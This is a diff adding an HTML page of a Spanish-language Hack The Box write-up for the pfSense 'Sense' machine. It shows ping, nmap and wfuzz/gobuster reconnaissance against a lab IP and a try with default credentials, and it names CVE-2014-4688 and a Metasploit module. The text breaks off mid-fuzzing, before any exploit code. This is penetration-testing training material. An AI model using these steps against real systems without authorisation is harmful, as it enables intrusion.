@@ -1,0 +1,1325 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sense - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-sense/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Sense - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-sense/sense_logo.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-precious/">
+          <span class="side-post-card-title">Precious</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/WiFi-Notes1/">
+          <span class="side-post-card-title">Hacking WiFi</span>
+          <span class="side-post-card-platform">Modo Monitor y Falsificación de MAC de una Tarjeta de Red</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Sense</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-shocker/">
+          <span class="side-post-card-title">Shocker</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-mirai/">
+          <span class="side-post-card-title">Mirai</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy Machine</div>
+    
+    <h1>Sense - Hack The Box</h1>
+    <div class="post-meta">8 March 2023 · 15 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-sense/sense_logo.png" alt="Sense - Hack The Box">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina que jugó un poco con mi paciencia porque utilicé Fuzzing para listar archivos en la página web para encontrar algo útil, que si encontré, pero se tardó bastante, mucho más que en otras máquinas por lo que tuve que distraerme un poco en lo que terminaba. En fin, se encontró información crítica como credenciales para acceder al servicio pfSense y se utilizó un Exploit CVE-2014-4688 para poder conectarnos de manera remota, siendo que nos conecta como Root, no fue necesario hacer una escalada de privilegios.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>wfuzz</code></li><li><code>gobuster</code></li><li><code>burpsuite</code></li><li><code>nc</code></li><li><code>metasploit framework(msfconsole)</code></li><li><code>meterpreter</code></li><li><code>Módulo: exploit/unix/http/pfsense_graph_injection_exec</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#Fuzz2">Buscando Archivos de Texto con Fuzzing</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#PruebaExp">Buscando un Exploit para pfSense</a>
+          <ul>
+            <li><a href="#PruebaExp2">Probando Exploit: pfSense &lt; 2.1.4 - &lsquo;status_rrd_graph_img.php&rsquo; Command Injection</a></li>
+          </ul>
+        </li>
+        <li><a href="#PruebaExp3">Ganando Acceso con Metasploit Framework</a></li>
+        <li><a href="#PruebaExp4">Inyectando Comandos en status_rrd_graph_img.php de pfSense</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#Fuzz2">Buscando Archivos de Texto con Fuzzing</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#PruebaExp">Buscando un Exploit para pfSense</a>
+          <ul>
+            <li><a href="#PruebaExp2">Probando Exploit: pfSense &lt; 2.1.4 - &lsquo;status_rrd_graph_img.php&rsquo; Command Injection</a></li>
+          </ul>
+        </li>
+        <li><a href="#PruebaExp3">Ganando Acceso con Metasploit Framework</a></li>
+        <li><a href="#PruebaExp4">Inyectando Comandos en status_rrd_graph_img.php de pfSense</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.10.10.60                                                                                     
+</span></span><span style="display:flex;"><span>PING 10.10.10.60 <span style="color:#f92672">(</span>10.10.10.60<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.60: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">132</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.60: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">130</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.60: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">131</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.60: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">131</span> ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.10.60 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3007ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 130.494/131.036/131.810/0.483 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.10.60 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-03-08 13:43 CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 13:43
+</span></span><span style="display:flex;"><span>Scanning 10.10.10.60 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.10.60
+</span></span><span style="display:flex;"><span>Discovered open port 443/tcp on 10.10.10.60
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.10.60 from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span> due to <span style="color:#ae81ff">11</span> out of <span style="color:#ae81ff">16</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 13:44, 30.71s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.60
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.61s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2023-03-08 13:43:35 CST <span style="color:#66d9ef">for</span> 31s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>80/tcp  open  http    syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>443/tcp open  https   syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 30.87 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">131088</span> <span style="color:#f92672">(</span>5.768MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">18</span> <span style="color:#f92672">(</span>792B<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Veo únicamente dos puertos activos, el que ya conocemos el puerto HTTP y otro. Veamos que nos dice el escaneo de servicios.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -p80,443 10.10.10.60 -oN targeted                          
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-03-08 13:45 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.60
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>80/tcp  open  http     lighttpd 1.4.35
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://10.10.10.60/
+</span></span><span style="display:flex;"><span>|_http-server-header: lighttpd/1.4.35
+</span></span><span style="display:flex;"><span>443/tcp open  ssl/http lighttpd 1.4.35
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>|_http-server-header: lighttpd/1.4.35
+</span></span><span style="display:flex;"><span>|_http-title: Login
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>Common Name <span style="color:#f92672">(</span>eg, YOUR name<span style="color:#f92672">)</span>/organizationName<span style="color:#f92672">=</span>CompanyName/stateOrProvinceName<span style="color:#f92672">=</span>Somewhere/countryName<span style="color:#f92672">=</span>US
+</span></span><span style="display:flex;"><span>| Not valid before: 2017-10-14T19:21:35
+</span></span><span style="display:flex;"><span>|_Not valid after:  2023-04-06T19:21:35
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.26 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Supongo que al entrar en la página web nos redirigirá al puerto 443, igualmente vemos que usan un servicio versión <strong>lighthttpd 1.4.35</strong>. Veamos que nos dice la página.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos a ver que show.</p>
+<p>Justamente, cuando ponemos la IP nos dice que hay riesgo por el certificado, etc., dando en aceptar el riesgo nos va a redirigir a un login.</p>
+<p><img src="/assets/images/htb-writeup-sense/Captura1.png" alt=""></p>
+<p>Se puede ver algo llamado <strong>PF Sense</strong>, supongo que es el servicio que usa la página, antes de investigarlo, veamos que nos dice el <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura2.png">
+</p>
+<p>Ahí vemos el servidor web y la página usa PHP, ahora investiguemos el servicio.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Servicio PfSense</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>pfSense es una distribución personalizada de FreeBSD adaptado para su uso como Firewall y Enrutador. Se caracteriza por ser de código abierto, puede ser instalado en una gran variedad de ordenadores, y además cuenta con una interfaz web sencilla para su configuración.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Ósea que es un <strong>Firewall</strong>, intentemos entrar con credenciales por defecto, estas son:</p>
+<ul>
+<li>Username: <em>admin</em></li>
+<li>Contraseña: <em>pfsense</em></li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura3.png">
+</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura4.png">
+</p>
+<p>No pues no sirvió, mejor hagamos un <strong>Fuzzing</strong> para saber que subpáginas tiene.</p>
+<p><strong>OJO</strong>, se tiene que cambiar el comando porque saldrán muchos 301, para solucionarlo le agregamos la <strong>-L</strong>.</p>
+<h3 id="Fuzz">Fuzzing</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -L -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.60/FUZZ/
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.10.10.60/FUZZ/
+</span></span><span style="display:flex;"><span>Total requests: 220560
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000014:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">173</span> L    <span style="color:#ae81ff">425</span> W      <span style="color:#ae81ff">6690</span> Ch     <span style="color:#e6db74">&#34;https://10.10.10.60//&#34;</span>                                                     
+</span></span><span style="display:flex;"><span>000003597:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">228</span> L    <span style="color:#ae81ff">851</span> W      <span style="color:#ae81ff">7492</span> Ch     <span style="color:#e6db74">&#34;tree&#34;</span>                                                                      
+</span></span><span style="display:flex;"><span>000008057:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">173</span> L    <span style="color:#ae81ff">404</span> W      <span style="color:#ae81ff">6113</span> Ch     <span style="color:#e6db74">&#34;installer&#34;</span>                                                                 
+</span></span><span style="display:flex;"><span>000045240:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">173</span> L    <span style="color:#ae81ff">425</span> W      <span style="color:#ae81ff">6690</span> Ch     <span style="color:#e6db74">&#34;https://10.10.10.60//&#34;</span>                                                     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: 1527.095
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">220560</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">220543</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: 144.4310
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-c</em></td>
+					<td>Para ver el resultado en un formato colorido.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;hc</em></td>
+					<td>Para no mostrar un código de estado en los resultados.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-L</em></td>
+					<td>Para que wfuzz siga las redirecciones que surjan en el fuzzing.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probemos con <strong>Gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">20</span> -k
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.5
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     https://10.10.10.60/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/themes               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/themes/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/css/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/includes             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/includes/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/javascript           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/javascript/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/classes              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/classes/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/widgets              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/widgets/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/tree                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/tree/<span style="color:#f92672">]</span>
